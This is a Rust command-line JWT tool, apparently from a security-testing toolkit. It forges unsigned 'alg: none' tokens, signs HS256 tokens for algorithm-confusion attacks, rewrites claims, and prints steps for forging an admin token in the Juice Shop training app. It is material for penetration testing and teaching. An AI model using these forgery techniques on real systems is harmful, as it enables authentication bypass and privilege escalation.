//! JWT manipulation CLI tool
//!
//! Usage:
//!   jwt-tool decode <token>
//!   jwt-tool unsigned '{"role": "admin"}'
//!   jwt-tool hs256 '{"role": "admin"}' <secret>
//!   jwt-tool juice-shop

use clap::{Parser, Subcommand};
use serde_json::Value;
use web_security_toolkit::jwt::*;

#[derive(Parser)]
#[command(name = "jwt-tool")]
#[command(about = "JWT manipulation tool for security testing")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Decode a JWT token (without verification)
    Decode {
        /// JWT token to decode
        token: String,
    },
    /// Create an unsigned JWT (alg: none)
    Unsigned {
        /// JSON payload
        payload: String,
    },
    /// Create a HS256 signed JWT
    Hs256 {
        /// JSON payload
        payload: String,
        /// HMAC secret (use public key for algorithm confusion)
        secret: String,
    },
    /// Modify JWT claims
    Modify {
        /// Original JWT token
        token: String,
        /// JSON modifications to apply
        modifications: String,
    },
    /// List algorithm variants for testing
    Algorithms,
    /// Juice Shop JWT challenges
    JuiceShop,
}

fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::Decode { token } => match DecodedJwt::decode(&token) {
            Ok(jwt) => {
                println!("=== JWT Decoded ===\n");
                println!("Header:");
                println!(
                    "{}\n",
                    serde_json::to_string_pretty(&jwt.header).unwrap_or_default()
                );
                println!("Payload:");
                println!(
                    "{}\n",
                    serde_json::to_string_pretty(&jwt.payload).unwrap_or_default()
                );
                println!("Algorithm: {}", jwt.algorithm().unwrap_or("unknown"));
                println!("Signature: {} bytes", jwt.signature.len());
            }
            Err(e) => {
                eprintln!("Error decoding JWT: {}", e);
                std::process::exit(1);
            }
        },
        Commands::Unsigned { payload } => match serde_json::from_str::<Value>(&payload) {
            Ok(json_payload) => {
                let token = create_unsigned_jwt(&json_payload);
                println!("=== Unsigned JWT (alg: none) ===\n");
                println!("{}\n", token);
                println!("Note: Some servers accept tokens ending with '.' or without signature.");
                println!("Try variations:");
                println!("  {}", token);
                println!("  {}", token.trim_end_matches('.'));
            }
            Err(e) => {
                eprintln!("Invalid JSON payload: {}", e);
                std::process::exit(1);
            }
        },
        Commands::Hs256 { payload, secret } => match serde_json::from_str::<Value>(&payload) {
            Ok(json_payload) => {
                let token = create_hs256_jwt(&json_payload, secret.as_bytes());
                println!("=== HS256 Signed JWT ===\n");
                println!("{}\n", token);
                println!("Secret used: {}", secret);
                println!("\nFor algorithm confusion attack:");
                println!("  Use the server's public key as the secret");
            }
            Err(e) => {
                eprintln!("Invalid JSON payload: {}", e);
                std::process::exit(1);
            }
        },
        Commands::Modify {
            token,
            modifications,
        } => match serde_json::from_str::<Value>(&modifications) {
            Ok(mods) => match modify_jwt_payload(&token, &mods) {
                Ok(new_token) => {
                    println!("=== Modified JWT (unsigned) ===\n");
                    println!("{}\n", new_token);
                }
                Err(e) => {
                    eprintln!("Error modifying JWT: {}", e);
                    std::process::exit(1);
                }
            },
            Err(e) => {
                eprintln!("Invalid JSON modifications: {}", e);
                std::process::exit(1);
            }
        },
        Commands::Algorithms => {
            println!("=== JWT Algorithm Variants ===\n");
            for alg in jwt_algorithm_variants() {
                println!("  {}", alg);
            }
            println!("\nCommon attack vectors:");
            println!("  - 'none' / 'None' / 'NONE': Remove signature");
            println!("  - RS256 -> HS256: Use public key as HMAC secret");
        }
        Commands::JuiceShop => {
            println!("=== Juice Shop JWT Challenges ===\n");

            for attack in juice_shop_jwt_attacks() {
                println!("{}", attack.name);
                println!("  {}\n", attack.description);
            }

            println!("Steps for Unsigned JWT challenge:");
            println!("1. Login and get JWT from localStorage");
            println!("2. Decode the JWT to see current claims");
            println!("3. Create unsigned JWT with admin role");
            println!("4. Replace token in localStorage\n");

            println!("Example payload:");
            println!("  jwt-tool unsigned '{{\"data\":{{\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"}}}}'");
        }
    }
}
